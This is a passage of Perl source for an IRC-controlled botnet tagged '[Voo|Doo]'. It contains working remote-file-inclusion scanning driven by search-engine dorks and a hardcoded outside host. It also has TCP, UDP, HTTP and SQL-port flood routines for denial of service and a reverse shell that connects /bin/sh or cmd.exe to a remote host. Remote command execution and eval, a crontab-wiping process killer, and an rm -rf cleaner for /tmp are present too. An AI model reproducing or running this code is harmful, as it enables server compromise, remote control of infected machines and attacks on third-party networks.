	my $bug = $_[0];
	my @links = &GetLink();
	my $test = "http://201.218.196.231/fastspread.txt?";
	my $response = "http://201.218.196.231/fastspread.txt?";
	my $printcmd = "RFI?";
	my @forks;
	my $forked++;
	sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] Stron : ".scalar(@links));
	my @uni = &Unique(@links);
	sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] Wyczyszczono : ".scalar(@uni));
	&Remove();
	my $testx = scalar(@uni);
	my $startx = 0;
	foreach my $site (@uni){
		$counter++;
		my $link = "http://".$site.$bug.$test."?";
		my $responser = "http://".$site.$bug.$response."?";
		print($link."\n"); # Prints test links in terminal
		if($counter %$exploitcounter == 0){
			my $start = 0;
			foreach my $f(@forks){
				waitpid($f,0);
				$forks[$start--];
				$start++;
			}
			$startx = 0;
		}
		$forks[$startx]=fork();
		if($forks[$startx] == 0){
			my $htmlsite = &Query($link,"3");
			if($htmlsite =~ /kangkung/){
				my $responsing = &Query($responser,"3");
					if($responsing =~ /kangkung/){
				sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] Safe Off :  "."http://".$site.$bug.$printcmd);
			}}
			elsif($htmlsite =~ /kangkung/){
			sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] Safe Onn : "."http://".$site.$bug.$printcmd);
			}
			exit(0);
		}
		if($counter %150 == 0){
		#	&message($channel,"BanTeNHacK SabaR.. lg NyaRi 12kNd 3->  ".$counter." dari ".$testx);
		}
		$startx++;
	}
	my $start = 0;
	foreach my $f(@forks){
		waitpid($f,0);
		$forks[$start--];
		$start++;
	}
}
sub SiteDomains(){
	my @dom = (
			"de","nl","be","dk","sk","com","net","org",
			"info","uk","se","it","fr","hu","pl","ru",
			"ro","be","cz","edu","jp"
		  );
} 

sub Google(){
	my($dork)=@_;
	$dork=&Key($dork);
	my $start;
	my $num=100;
	my $max=100*10;
	my @dom = &GoogleDomains();
	my $file = "/tmp/google.txt";
	my $html;
	my @result;
	for($start=0;$start < $max; $start += $num){
		my $Domains = $dom[rand(scalar(@dom))];
		$html.=&Query("http://www.google.".$Domains."/search?q=".$dork."&num=".$num."&sa=N&filter=0&start=".$start);
	}
	while($html =~ m/<h2 class=r><a href=\"http:\/\/(.+?)\"\ class/g){
		$1 =~ /google/ || push(@result,&Links($1,$file));
	}
	return(@result);
}

sub Yahoo(){
	my($dork)=@_;
	$dork=&Key($dork);
	my $start;
	my $num=100;
	my $max=100*10;
	my $file = "/tmp/yahoo.txt";
	my $html;
	my @result;
	for($start=0;$start < $max; $start += $num){
		$html.=&Query("http://search.yahooapis.com/WebSearchService/V1/webSearch?appid=SiteSearch&query=".$dork."&results=".$num."&start=".$start);
	}
	while($html =~ m/<Url>http:\/\/(.+?)\<\/Url>/g){
		$1 =~ /yahoo/ || push(@result,&Links($1,$file));
	}
	return(@result);
}




sub baidu(){
my @lst;
my $key = $_[0];
my $pg = 0;
    for($i=0; $i<=1000; $i+=10){
my $lib=("http://www.baidu.com/s?lm=0&si=&rn=10&ie=gb2312&ct=0&wd=".key($key)."&pn=".$start."&ver=0&cl=3");
my $Res=query($lib);
while($Res =~ m/href=\"http:\/\/(.*?)\"/ig){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}


sub Alltheweb(){
	my($dork)=@_;
	$dork=&Key($dork);
	my $start;
	my $num=100;
	my $max=100*10;
	my $file = "/tmp/alltheweb.txt";
	my $html;
	my @result;
	for($start=0;$start < $max; $start += $num){
		$html.=&Query("http://www.alltheweb.com/search?advanced=1&cat=web&type=all&hits=".$num."&ocjp=1&q=".$dork."&o=".$start);
	}
	while($html =~ m/<span class=\"resURL\">http:\/\/(.+?)\ /g){
		$1 =~ /alltheweb/ || push(@result,&Links($1,$file));
	}
	return(@result);
}


sub UOL(){
	my($dork)=@_;
	$dork=&Key($dork);
	my $start;
	my $num=20;
	my $max=100*10;
	my $file = "/tmp/UOL.txt";
	my $html;
	my @result;
	for($start=0;$start < $max; $start += $num){
		$html.=&Query("http://busca.uol.com.br/www/index.html?q=".$dork."&start=".$start);
	}
	while($html =~ m/<a href=\"http:\/\/([^>\"]*)/g){
		$1 =~ /busca|uol|yahoo/ || push(@result,&Links($1,$file));
	}
	return(@result);
}

sub fire(){
	my($dork)=@_;
	$dork=&Key($dork);
	my $start;
	my $num=10;
	my $max=100*10;
	my $file = "/tmp/fire.txt";
	my $html;
	my @result;
	for($start=0;$start < $max; $start += $num){
		$html.=&Query("http://suche.fireball.de/cgi-bin/pursuit?pag=".$start."&query=".$dork."&cat=fb_loc&idx=all&enc=utf-8");
	}
	while($html =~ m/<a href=\"?http:\/\/(.+?)\//g){
		$1 =~ /msn|live|google|yahoo/ || push(@result,&Links($1,$file));
	}
	return(@result);
}

sub MSN(){
	my($dork)=@_;
	$dork=&Key($dork);
	my $start;
	my $num=10;
	my $max=100*10;
	my $file = "/tmp/msn.txt";
	my $html;
	my @result;
	for($start=0;$start < $max; $start += $num){
		$html.=&Query("http://search.live.com/results.aspx?q=".$dork."&first=".$start."&FORM=PERE");
	}
	while($html =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
		$1 =~ /msn|live/ || push(@result,&Links($1,$file));
	}
	return(@result);
}


sub Query(){
	my($link,$timeout)=@_;
	my $req=HTTP::Request->new(GET=>$link);
	my $ua=LWP::UserAgent->new();
	$ua->agent($User_Agent[rand(scalar(@User_Agent))]);
	$ua->timeout($timeout);
	my $response=$ua->request($req);
	return $response->content;
}

sub Key(){
	my $key=$_[0];
	$key =~ s/ /\+/g;
	$key =~ s/:/\%3A/g;
	$key =~ s/\//\%2F/g;
	$key =~ s/&/\%26/g;
	$key =~ s/\"/\%22/g;
	$key =~ s/\\/\%5C/g;
	$key =~ s/,/\%2C/g;
	return $key;
}

sub GetLink(){
		my @file = ("/tmp/google.txt","/tmp/yahoo.txt","/tmp/abacho.txt","/tmp/gigablast.txt","/tmp/msn.txt","/tmp/virgilio.txt","/tmp/seekport.txt","/tmp/alltheweb.txt","/tmp/aol.txt","/tmp/UOL.txt","/tmp/fire.txt");
	my $link;
	my @total;
	foreach my $n (@file){
		open(F,'<',$n);
		while($link = <F>){
			$link=~s/[\r\n]//g;
			push(@total,$link);
		}
		close(F);
	}
	return(@total);
}

sub Remove(){
	my @file = ("/tmp/google.txt","/tmp/yahoo.txt","/tmp/abacho.txt","/tmp/gigablast.txt","/tmp/msn.txt","/tmp/virgilio.txt","/tmp/seekport.txt","/tmp/alltheweb.txt","/tmp/aol.txt","/tmp/UOL.txt","/tmp/fire.txt");
	foreach my $n (@file){
		system("rm -rf ".$n);
	}
}
sub GoogleDomains(){
	my @ret = (
			"ae","com.ar","at","com.au","be","com.br","ca","ch","cl","de","dk","fi","fr","gr","com.hk",
			"ie","co.il","it","co.jp","co.kr","lt","lv","nl","com.pa","com.pe","pl","pt","ru","com.sg",
			"com.tr","com.tw","com.ua","co.uk","hu"
		  );
	return(@ret);
}
sub Unique{
	my @Unique = ();
	my %seen = ();
	foreach my $element ( @_ ){
		next if $seen{ $element }++;
		push @Unique, $element;
	}
	return @Unique;
}
sub Links(){
	my ($link,$file_print) = @_;
	$link=~s/http:\/\///g;
	my $host = $link;
	my $host_dir = $host;
	my @links;
	$host_dir=~s/(.*)\/[^\/]*$/\1/;
	$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
	$host_dir=&End($host_dir);
	$host=&End($host);
	$link=&End($host);
	push(@links,$link,$host,$host_dir);
	open($file,'>>',$file_print);
	print $file "$link\n$host_dir\n$host\n";
	close($file);
	return @links;
}
sub End(){
	$string=$_[0];
	$string.="/";
	$string=~s/\/\//\//;
	while($string=~/\/\//){
		$string=~s/\/\//\//;
	}
	return($string);
}

sub Agent(){
	my @ret = (
	"Microsoft Internet Explorer/4.0b1 (Windows 95)",
	"Mozilla/1.22 (compatible; MSIE 1.5; Windows NT)",
	"Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)",
	"Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)",
	"Mozilla/4.0 (compatible; MSIE 5.0; SunOS 5.9 sun4u; X11)",
	"Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)",
	"Mozilla/4.0 (compatible; MSIE 5.23; Mac_PowerPC)",
	"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)",
	"Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322)",
	"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)",
	"Mozilla/4.0 (compatible; MSIE 7.0b; Win32)",
	"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)",
	"Microsoft Pocket Internet Explorer/0.6",
	"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)",
	"MOT-MPx220/1.400 Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Smartphone;",
	"Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.1; Windows NT 5.1;)",
	"Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)",
	"Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)",
	"Advanced Browser (http://www.avantbrowser.com)",
	"Avant Browser (http://www.avantbrowser.com)",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)",
	"Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)",
	"Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)",
	"Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007",
	"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511",
	"Mozilla/5.0 (X11; U; Linux i686; cs-CZ; rv:1.7.12) Gecko/20050929",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0",
	"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox",
	"Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4",
	"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.10) Gecko/20050716 Firefox/1.0.6",
	"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-GB; rv:1.7.10) Gecko/20050717 Firefox/1.0.6",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7",
	"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4",
	"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1",
	"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1",
	"Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b1) Gecko/20060710 Firefox/2.0b1",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b2) Gecko/20060710 Firefox/2.0b2",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1) Gecko/20060918 Firefox/2.0",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051219 SeaMonkey/1.0b",
	"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.0.1) Gecko/20060130 SeaMonkey/1.0",
	"Mozilla/3.0 (OS/2; U)",
	"Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)",
	"Mozilla/4.61 (Macintosh; I; PPC)",
	"Mozilla/4.61 [en] (OS/2; U)",
	"Mozilla/4.7C-CCK-MCD {C-UDP; EBM-APPLE} (Macintosh; I; PPC)",
	"Mozilla/4.8 [en] (Windows NT 5.0; U)" );
return(@ret);
}


######################
#   End of MAILER    # 
######################
# A /tmp cleaner
if ($funcarg =~ /^cleartmp/) { 
    system 'cd /tmp;rm -rf *';
			sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] /tmp is Cleaned");
			}
#-#-#-#-#-#-#-#-#
# Flooders IRC  #
#-#-#-#-#-#-#-#-#		   
# msg, @msgflood <who>
if ($funcarg =~ /^msgflood (.+?) (.*)/) {
	for($i=0; $i<=10; $i+=1){
		sendraw($IRC_cur_socket, "PRIVMSG ".$1." ".$2);
	}
		sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] Msg Flood Excecuted on ".$1." ");
}
		   
# dccflood, @dccflood <who>
if ($funcarg =~ /^dccflood (.*)/) {
	for($i=0; $i<=10; $i+=1){
		sendraw($IRC_cur_socket, "PRIVMSG ".$1." :\001DCC CHAT chat 1121485131 1024\001\n");
	}
		sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] DcpFlood Excecuted on ".$1." ");
}	   
# ctcpflood, @ctcpflood <who>
if ($funcarg =~ /^ctcpflood (.*)/) {
	for($i=0; $i<=10; $i+=1){
		sendraw($IRC_cur_socket, "PRIVMSG ".$1." :\001VERSION\001\n");
		sendraw($IRC_cur_socket, "PRIVMSG ".$1." :\001PING\001\n");
	}
		sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] Tcp Flood Excecuted on ".$1." ");
}	   
# noticeflood, @noticeflood <who>
	if ($funcarg =~ /^noticeflood (.*)/) {
		for($i=0; $i<=10; $i+=1){
			sendraw($IRC_cur_socket, "NOTICE ".$1." :w3tFL00D\n");
	}
		sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] Notice Flood Excecuted on ".$1." ");
}	   
# Channel Flood, @channelflood
if ($funcarg =~ /^channelflood/) {
	for($i=0; $i<=25; $i+=1){ 
		sendraw($IRC_cur_socket, "JOIN #".(int(rand(99999))) );
	}
		sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] Channel Flood Excecuted ");
}
# Maxi Flood, @maxiflood
if ($funcarg =~ /^maxiflood(.*)/) {
	for($i=0; $i<=15; $i+=1){
			sendraw($IRC_cur_socket, "NOTICE ".$1." :w3tFl00D\n");
			sendraw($IRC_cur_socket, "PRIVMSG ".$1." :\001VERSION\001\n");
			sendraw($IRC_cur_socket, "PRIVMSG ".$1." :\001PING\001\n");
			sendraw($IRC_cur_socket, "PRIVMSG ".$1." :w3tFl00D\n");			
	}
		sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] All Flood Excecuted on ".$1." ");
}
######################
#  irc    #
######################
			if ($funcarg =~ /^reset/) {
				sendraw($IRC_cur_socket, "QUIT :");
			}
			if ($funcarg =~ /^join (.*)/) {
				sendraw($IRC_cur_socket, "JOIN ".$1);
			}
			if ($funcarg =~ /^part (.*)/) {
				sendraw($IRC_cur_socket, "PART ".$1);
			}
			if ($funcarg =~ /^voice (.*)/) { 
		      sendraw($IRC_cur_socket, "MODE $printl +v ".$1);
           }
			if ($funcarg =~ /^devoice (.*)/) { 
		      sendraw($IRC_cur_socket, "MODE $printl -v ".$1);
           }
			if ($funcarg =~ /^halfop (.*)/) { 
		      sendraw($IRC_cur_socket, "MODE $printl +h ".$1);
           }
			if ($funcarg =~ /^dehalfop (.*)/) { 
		      sendraw($IRC_cur_socket, "MODE $printl -h ".$1);
           }
			if ($funcarg =~ /^owner (.*)/) { 
		      sendraw($IRC_cur_socket, "MODE $printl +q ".$1);
           }
			if ($funcarg =~ /^deowner (.*)/) { 
		      sendraw($IRC_cur_socket, "MODE $printl -q ".$1);
			}
			if ($funcarg =~ /^op (.*)/) { 
		      sendraw($IRC_cur_socket, "MODE $printl +o ".$1);
           }		   
			if ($funcarg =~ /^deop (.*)/) { 
		      sendraw($IRC_cur_socket, "MODE $printl -o ".$1);
           }
######################
#End of Join And Part#
######################
######################
#     TCPFlood       #
######################

			if ($funcarg =~ /^tcpflood\s+(.*)\s+(\d+)\s+(\d+)/) {
				sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] Tcp Ddos Attacking ".$1.":".$2."  for ".$3." seconds.");
				my $itime = time;
				my ($cur_time);
				$cur_time = time - $itime;
				while ($3>$cur_time){
					$cur_time = time - $itime;
					&tcpflooder("$1","$2","$3");
				}
				sendraw($IRC_cur_socket,"PRIVMSG $printl :[Voo|Doo] Tcp Ddos Attack done ".$1.":".$2.".");
			}
######################
#  End of TCPFlood   #
######################
######################
#               SQL Fl00dEr                     #
######################
if ($funcarg =~ /^sqlflood\s+(.*)\s+(\d+)/) {
sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] Sql Ddos Attacking ".$1." on port 3306 for ".$2." seconds.");
my $itime = time;
my ($cur_time);
$cur_time = time - $itime;
while ($2>$cur_time){
$cur_time = time - $itime;
	my $socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$1, PeerPort=>3306);
	print $socket "GET / HTTP/1.1\r\nAccept: */*\r\nHost: ".$1."\r\nConnection: Keep-Alive\r\n\r\n";
close($socket);
}
sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] Sql Attacking done ".$1.".");
}
######################
#   Back Connect     #

######################
			if ($funcarg =~ /^back\s+(.*)\s+(\d+)/) {
				my $host = "$1";
				my $porta = "$2";
				my $proto = getprotobyname('tcp');
				my $iaddr = inet_aton($host);
				my $paddr = sockaddr_in($porta, $iaddr);
				my $shell = "/bin/sh -i";
				if ($^O eq "MSWin32") {
					$shell = "cmd.exe";
				}
				socket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die "socket: $!";
				connect(SOCKET, $paddr) or die "connect: $!";
				open(STDIN, ">&SOCKET");
				open(STDOUT, ">&SOCKET");
				open(STDERR, ">&SOCKET");
				system("$shell");
				close(STDIN);
				close(STDOUT);
				close(STDERR);
				if ($estatisticas){
					sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] Back Connecting to $host:$porta");
				}
			}
######################
#End of  Back Connect#
######################

######################
#End of MultiSCANNER #
######################
if ($funcarg =~ /^killer/) 
          {
          sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo]Pid Killing.");
          system("crontab -r");
          $PID = $$;
          @PIDS = `ps x |awk '{print \$1;}'`;
          foreach my $pidi(@PIDS){
          if($pidi == $PID){
          return;
          }else{
          system("kill -9 $pidi");
          }
          }
          } 
######################
#     HTTPFlood      #
######################
			if ($funcarg =~ /^httpflood\s+(.*)\s+(\d+)/) {
				sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] Http Flood Attacking ".$1." on port 80 for ".$2."  seconds .");
				my $itime = time;
				my ($cur_time);
				$cur_time = time - $itime;
				while ($2>$cur_time){
					$cur_time = time - $itime;
					my $socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$1, PeerPort=>80);
					print $socket "GET / HTTP/1.1\r\nAccept: */*\r\nHost: ".$1."\r\nConnection: Keep-Alive\r\n\r\n";
					close($socket);
				}
				sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] Http-Ddos Attacking done ".$1.".");
			}
######################
#  End of HTTPFlood  #
######################
######################
#     UDPFlood       #
######################
			if ($funcarg =~ /^udpflood\s+(.*)\s+(\d+)\s+(\d+)/) {
				sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] Udp Attacking ".$1." with ".$2." Kb Packets for ".$3." seconds.");
				my ($dtime, %pacotes) = udpflooder("$1", "$2", "$3");
				$dtime = 1 if $dtime == 0;
				my %bytes;
				$bytes{igmp} = $2 * $pacotes{igmp};
				$bytes{icmp} = $2 * $pacotes{icmp};
				$bytes{o} = $2 * $pacotes{o};
				$bytes{udp} = $2 * $pacotes{udp};
				$bytes{tcp} = $2 * $pacotes{tcp};
				sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] Udp Results ".int(($bytes{icmp}+$bytes{igmp}+$bytes{udp} + $bytes{o})/1024)." Kb in ".$dtime." seconds to ".$1.".");
			}
######################
#  End of Udpflood   #
######################
			exit;
		}
	}

sub ircase {
	my ($kem, $printl, $case) = @_;
	if ($case =~ /^join (.*)/) {
		j("$1");
	}
	if ($case =~ /^part (.*)/) {
		p("$1");
	}
	if ($case =~ /^rejoin\s+(.*)/) {
		my $chan = $1;
		if ($chan =~ /^(\d+) (.*)/) {
			for (my $ca = 1; $ca <= $1; $ca++ ) {
				p("$2");
				j("$2");
			}
		} else {
			p("$chan");
			j("$chan");
		}
	}

	if ($case =~ /^op/) {
		op("$printl", "$kem") if $case eq "op";
		my $oarg = substr($case, 3);
		op("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
	}

	if ($case =~ /^deop/) {
		deop("$printl", "$kem") if $case eq "deop";
		my $oarg = substr($case, 5);
		deop("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
	}

	if ($case =~ /^msg\s+(\S+) (.*)/) {
		msg("$1", "$2");
	}

	if ($case =~ /^flood\s+(\d+)\s+(\S+) (.*)/) {
		for (my $cf = 1; $cf <= $1; $cf++) {
			msg("$2", "$3");
		}
	}

	if ($case =~ /^ctcp\s+(\S+) (.*)/) {
		ctcp("$1", "$2");
	}

	if ($case =~ /^ctcpflood\s+(\d+)\s+(\S+) (.*)/) {
		for (my $cf = 1; $cf <= $1; $cf++) {
			ctcp("$2", "$3");
		}
	}

	if ($case =~ /^nick (.*)/) {
		nick("$1");
	}

	if ($case =~ /^connect\s+(\S+)\s+(\S+)/) {
		conectar("$2", "$1", 6667);
	}

	if ($case =~ /^raw (.*)/) {
		sendraw("$1");
	}

	if ($case =~ /^eval (.*)/) {
		eval "$1";
	}
}

sub get_html() {
$test=$_[0];

		$ip=$_[1];
		$port=$_[2];

my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
if(defined($ip) && defined($port)) {
		$ua->proxy("http","http://$ip:$port/");
		$ua->agent("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)");
}
$ua->timeout(1);
my $response=$ua->request($req);
if ($response->is_success) {
	$re=$response->content;
}
return $re;
}

sub addproc {

	my $proc=$_[0];
	my $dork=$_[1];
	
	open(FILE,">>/tmp/pids");
	print FILE $proc." [".$irc_servers{$IRC_cur_socket}{'nick'}."] $dork\n";
	close(FILE);
}


sub delproc {

	my $proc=$_[0];
	open(FILE,"/tmp/pids");

	while(<FILE>) {
		$_ =~ /(\d+)\s+(.*)/;
		$childs{$1}=$2;
	}
	close(FILE);
	delete($childs{$proc});

	open(FILE,">/tmp/pids");

	for $klucz (keys %childs) {
		print FILE $klucz." ".$childs{$klucz}."\n";
	}
}

sub shell {
	my $printl=$_[0];
	my $comando=$_[1];
	if ($comando =~ /cd (.*)/) {
		chdir("$1") || msg("$printl", "No such file or directory");
		return;
	} elsif ($pid = fork) {
		waitpid($pid, 0);
	} else {
		if (fork) {
			exit;
		} else {
			my @resp=`$comando 2>&1 3>&1`;
			my $c=0;
			foreach my $linha (@resp) {
				$c++;
				chop $linha;
				sendraw($IRC_cur_socket, "PRIVMSG $printl :$linha");
				if ($c == "$linas_max") {
					$c=0;
					sleep $sleep;
				}
			}
			exit;
		}
	}
}

sub tcpflooder {
	my $itime = time;
	my ($cur_time);
	my ($ia,$pa,$proto,$j,$l,$t);
	$ia=inet_aton($_[0]);
	$pa=sockaddr_in($_[1],$ia);
	$ftime=$_[2];
	$proto=getprotobyname('tcp');
	$j=0;$l=0;
	$cur_time = time - $itime;
	while ($l<1000){
		$cur_time = time - $itime;
		last if $cur_time >= $ftime;
		$t="SOCK$l";
		socket($t,PF_INET,SOCK_STREAM,$proto);
		connect($t,$pa)||$j--;
		$j++;
		$l++;
	}
	$l=0;
	while ($l<1000){
		$cur_time = time - $itime;
		last if $cur_time >= $ftime;
		$t="SOCK$l";
		shutdown($t,2);
		$l++;
	}
}

sub udpflooder {
	my $iaddr = inet_aton($_[0]);
	my $msg = 'A' x $_[1];
	my $ftime = $_[2];
	my $cp = 0;
	my (%pacotes);
	$pacotes{icmp} = $pacotes{igmp} = $pacotes{udp} = $pacotes{o} = $pacotes{tcp} = 0;
	socket(SOCK1, PF_INET, SOCK_RAW, 2) or $cp++;
	socket(SOCK2, PF_INET, SOCK_DGRAM, 17) or $cp++;
	socket(SOCK3, PF_INET, SOCK_RAW, 1) or $cp++;
	socket(SOCK4, PF_INET, SOCK_RAW, 6) or $cp++;
	return(undef) if $cp == 4;
	my $itime = time;
	my ($cur_time);
	while ( 1 ) {
		for (my $porta = 1; $porta <= 65000; $porta++) {
			$cur_time = time - $itime;
			last if $cur_time >= $ftime;
			send(SOCK1, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{igmp}++;
			send(SOCK2, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{udp}++;
			send(SOCK3, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{icmp}++;
			send(SOCK4, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{tcp}++;
			for (my $pc = 3; $pc <= 255;$pc++) {
				next if $pc == 6;
				$cur_time = time - $itime;
				last if $cur_time >= $ftime;
				socket(SOCK5, PF_INET, SOCK_RAW, $pc) or next;
				send(SOCK5, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{o}++;
			}
		}
		last if $cur_time >= $ftime;
	}
	return($cur_time, %pacotes);
}

sub ctcp {
	return unless $#_ == 1;
	sendraw("PRIVMSG $_[0] :\001$_[1]\001");
}

sub msg {
	return unless $#_ == 1;
	sendraw("PRIVMSG $_[0] :$_[1]");
}

sub notice {
	return unless $#_ == 1;
	sendraw("NOTICE $_[0] :$_[1]");
}

sub op {
	return unless $#_ == 1;
	sendraw("MODE $_[0] +o $_[1]");
}

sub deop {
	return unless $#_ == 1;
	sendraw("MODE $_[0] -o $_[1]");
}

sub j {
	&join(@_);
}

sub join {
	return unless $#_ == 0;
	sendraw("JOIN $_[0]");
}

sub p {
	part(@_);
}

sub part {
	sendraw("PART $_[0]");
}

sub nick {
	return unless $#_ == 0;
	sendraw("NICK $_[0]");
}

sub quit {
	sendraw("QUIT :$_[0]");
}

sub fetch(){
	my $rnd=(int(rand(9999)));
	my $n= 80;
	if ($rnd<5000) {
		$n<<=1;
	}
	my $s= (int(rand(10)) * $n);
	my @dominios = ("removed-them-all");
	my @str;
	foreach $dom  (@dominios){
		push (@str,"@gstring");
	}
	my $query="www.google.com/search?q=";
	$query.=$str[(rand(scalar(@str)))];
	$query.="&num=$n&start=$s";
	my @lst=();
	sendraw("privmsg #debug :DEBUG only test googling: ".$query."");
	my $page = http_query($query);
	while ($page =~  m/<a href=\"?http:\/\/([^>\"]+)\"? class=l>/g){
		if ($1 !~ m/google|cache|translate/){
			push (@lst,$1);
		}
	}
	return (@lst);



sub links()
{
my @l;
my $link=$_[0];
my $host=$_[0];
my $hdir=$_[0];
$hdir=~s/(.*)\/[^\/]*$/\1/;
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$host.="/";
$link.="/";
$hdir.="/";
$host=~s/\/\//\//g;
$hdir=~s/\/\//\//g;
$link=~s/\/\//\//g;
push(@l,$link,$host,$hdir);
return @l;
}

sub geths(){
my $host=$_[0];
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
return $host;
}

sub key(){
my $chiave=$_[0];
$chiave =~ s/ /\+/g;
$chiave =~ s/:/\%3A/g;
$chiave =~ s/\//\%2F/g;
$chiave =~ s/&/\%26/g;
$chiave =~ s/\"/\%22/g;
$chiave =~ s/,/\%2C/g;
$chiave =~ s/\\/\%5C/g;
return $chiave;
}

sub query($){
my $url=$_[0];
$url=~s/http:\/\///;
my $host=$url;
my $query=$url;
my $page="";
$host=~s/href=\"?http:\/\///;
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$query=~s/$host//;
if ($query eq "") {$query="/";};
eval {
my $sock = IO::Socket::INET->new(PeerAddr=>"$host",PeerPort=>"80",Proto=>"tcp", Timeout=>"5") or return;
print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
my @r = <$sock>;
$page="@r";
close($sock);
};
return $page;
}

sub unici{
my @unici = ();
my %visti = ();
foreach my $elemento ( @_ )
{
